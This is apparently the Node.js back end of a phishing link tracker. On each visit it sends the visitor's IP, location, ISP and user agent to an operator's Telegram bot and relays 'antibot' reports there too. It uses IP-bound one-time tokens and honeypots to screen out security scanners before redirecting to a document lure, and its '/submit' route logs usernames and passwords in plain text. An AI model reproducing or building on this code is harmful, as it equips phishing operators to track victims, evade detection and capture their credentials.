// server.js
require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;
const DOCUMENT_URL = process.env.DOCUMENT_URL || 'https://example.com/your-secure-document';
const TOKEN_TTL_MS = (parseInt(process.env.TOKEN_TTL_MIN || '10', 10) * 60 * 1000);

app.use(express.json());

// 🔹 Trust proxy so req.ip gives real client IP
app.set('trust proxy', true);

// In-memory stores
let tokens = {};
let accessLogs = [];
let reportedIPs = new Set();

// Log helper
function logLine(line) {
  const stamp = new Date().toISOString();
  const entry = `[${stamp}] ${line}`;
  accessLogs.push(entry);
  console.log(entry);
}

// Rate limiter
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_PER_MIN || '60', 10),
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    logLine(`RATE_LIMIT_EXCEEDED ip=${getClientIp(req)} path=${req.originalUrl}`);
    res.status(429).send('Too many requests. Try again later.');
  }
});
app.use(limiter);

// Serve static assets
app.use('/static', express.static(path.join(__dirname)));

// Generate token
function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

// 🔹 Extract real client IP
function getClientIp(req) {
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip || '';
  if (ip.includes(',')) ip = ip.split(',')[0]; // first IP in case of multiple
  return ip.replace('::ffff:', '').trim();
}

// Endpoint for antibot reports
app.post('/__antibot-report', async (req, res) => {
  const { status, reason, ip, country, org } = req.body;
  logLine(`ANTIBOT_REPORT status=${status} reason="${reason}" ip=${ip} country=${country} org="${org}"`);

  const msg = `
🚨 *AntiBot Report*
📡 Status: ${status}
📍 IP: ${ip}
🌍 Country: ${country}
🏢 Org: ${org}
❌ Reason: ${reason}
  `;

  if (process.env.TELE_BOT && process.env.CHAT_ID) {
    try {
      await fetch(`https://api.telegram.org/bot${process.env.TELE_BOT}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: msg, parse_mode: "Markdown" })
      });
    } catch (err) {
      logLine(`ANTIBOT_TELEGRAM_ERROR ${err.message}`);
    }
  }

  res.json({ ok: true });
});

// Cleanup old tokens
function cleanupTokens() {
  const now = Date.now();
  for (const tk of Object.keys(tokens)) {
    const entry = tokens[tk];
    if (entry && entry.createdAt && (now - entry.createdAt > TOKEN_TTL_MS + 5 * 60 * 1000)) {
      delete tokens[tk];
    }
  }
}

app.post("/submit", (req, res) => {
  const { username, password, website } = req.body;

  // If honeypot is filled => it's a bot
  if (website && website.trim() !== "") {
    console.log("🚫 Bot detected (honeypot filled)!");
    return res.status(400).send("Bot activity detected");
  }

  // Process normally for humans
  console.log(`✅ Human submission: ${username}:${password}`);
  res.send("Form submitted successfully");
});

// Get IP info + local time
async function getIPInfo(ip) {
  if (!ip || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
    return { country: 'LOCAL', city: 'LOCAL', isp: 'LAN', timezone: 'LOCAL', localTime: new Date().toLocaleString() };
  }

  try {
    const resp = await fetch(`https://ipinfo.io/${ip}?token=${process.env.IP_INFO_KEY}`);
    if (!resp.ok) return {};
    const data = await resp.json();

    let localTime = 'N/A';
    if (data.timezone) {
      try {
        localTime = new Date().toLocaleString('en-US', { timeZone: data.timezone });
      } catch {
        localTime = 'N/A';
      }
    }

    return {
      country: data.country || 'N/A',
      city: data.city || 'N/A',
      isp: data.org || 'N/A',
      timezone: data.timezone || 'N/A',
      localTime
    };
  } catch (err) {
    logLine(`IPINFO_ERROR ip=${ip} err=${err.message}`);
    return {};
  }
}

// Send Telegram message once per IP
async function sendToTelegram(ip, ua, country, city, isp, timezone, localTime) {
  if (reportedIPs.has(ip)) {
    logLine(`TELEGRAM_SKIPPED_ALREADY_SENT ip=${ip}`);
    return;
  }

  reportedIPs.add(ip);

  const msg = `
📢 *New Link Click*

🕒 *Visitor Local Time:* ${localTime}
🕒 *UTC Time:* ${new Date().toISOString()}
🌐 *IP:* ${ip}
💻 *User-Agent:* ${ua}
📍 *Country:* ${country || 'N/A'}
🏙️ *City:* ${city || 'N/A'}
🏢 *ISP:* ${isp || 'N/A'}
🕰️ *Timezone:* ${timezone || 'N/A'}
✅ *Status:* OK
  `;

  const url = `https://api.telegram.org/bot${process.env.TELE_BOT}/sendMessage`;
  const body = {
    chat_id: process.env.CHAT_ID,
    text: msg,
    parse_mode: 'Markdown'
  };

  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await resp.json();
    logLine(`TELEGRAM_SENT ip=${ip} result=${JSON.stringify(data)}`);
  } catch (err) {
    logLine(`TELEGRAM_ERROR ip=${ip} err=${err.message}`);
  }
}

// Root route
app.get('/', async (req, res) => {
  cleanupTokens();

  const token = req.query.token;
  const clientIp = getClientIp(req);

  // Send Telegram only once per IP
  const ipInfo = await getIPInfo(clientIp);
  await sendToTelegram(
    clientIp,
    req.get('User-Agent'),
    ipInfo.country,
    ipInfo.city,
    ipInfo.isp,
    ipInfo.timezone,
    ipInfo.localTime
  );

  // Token check/issue
  if (!token || !tokens[token] || tokens[token].used || (Date.now() - (tokens[token]?.createdAt || 0) > TOKEN_TTL_MS)) {
    const newToken = generateToken();
    tokens[newToken] = {
      createdAt: Date.now(),
      ip: clientIp,
      used: false,
      ttl: TOKEN_TTL_MS
    };
    logLine(`TOKEN_ISSUED token=${newToken} ip=${clientIp}`);
    return res.redirect(`/?token=${newToken}`);
  }

  if (tokens[token].ip !== clientIp) {
    logLine(`IP_MISMATCH token=${token} issuedIp=${tokens[token].ip} requestIp=${clientIp}`);
    const newToken = generateToken();
    tokens[newToken] = {
      createdAt: Date.now(),
      ip: clientIp,
      used: false,
      ttl: TOKEN_TTL_MS
    };
    tokens[token].used = true;
    logLine(`TOKEN_ROTATED old=${token} new=${newToken} ip=${clientIp}`);
    return res.redirect(`/?token=${newToken}`);
  }

  tokens[token].used = true;
  logLine(`TOKEN_CONSUMED token=${token} ip=${clientIp}`);
  return res.sendFile(path.join(__dirname, 'index.html'));
});

// Document redirect with honeypot check
app.get('/redirect-document', async (req, res) => {
  const honeypot = req.query.hp_field;
  const clientIp = getClientIp(req);
  const ua = req.get('User-Agent');

  if (honeypot && honeypot.trim() !== '') {
    logLine(`HONEYPOT_TRIGGERED ip=${clientIp} ua="${ua}"`);
    return res.status(403).send('Access denied');
  }

  // ✅ Get IP info & send Telegram once
  const ipInfo = await getIPInfo(clientIp);
  await sendToTelegram(
    clientIp,
    ua,
    ipInfo.country,
    ipInfo.city,
    ipInfo.isp,
    ipInfo.timezone,
    ipInfo.localTime
  );

  logLine(`REDIRECT_DOCUMENT ip=${clientIp} ua="${ua}"`);
  res.redirect(DOCUMENT_URL);
});

// Status endpoint
app.get('/__status', (req, res) => {
  res.json({
    status: 'ok',
    tokens_in_memory: Object.keys(tokens).length,
    logs_in_memory: accessLogs.length,
    reported_ips: Array.from(reportedIPs)
  });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
  logLine(`SERVER_STARTED port=${PORT}`);
});
